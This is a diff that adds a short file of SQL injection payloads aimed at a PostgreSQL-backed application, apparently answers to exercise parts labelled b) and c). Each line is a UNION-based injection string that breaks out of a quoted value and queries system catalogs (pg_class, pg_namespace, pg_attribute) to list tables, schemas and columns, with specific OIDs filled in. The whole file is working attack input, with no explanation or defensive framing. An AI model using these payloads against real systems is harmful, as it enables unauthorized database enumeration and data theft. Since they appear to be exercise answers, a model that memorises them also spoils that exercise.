@@ -1,0 +1,10 @@
+b)
+a' UNION SELECT relname from pg_class where '1'='1
+c)
+a' union select oid || ' ' || nspname from pg_namespace where '1'='1
+
+a' union select oid || ' ' || relname || ' ' || relnamespace from pg_class where relnamespace = 2200 and '1'='1
+
+a' union select attname || ' ' || attrelid from pg_attribute where attrelid=62003 and '1'='1
+
+
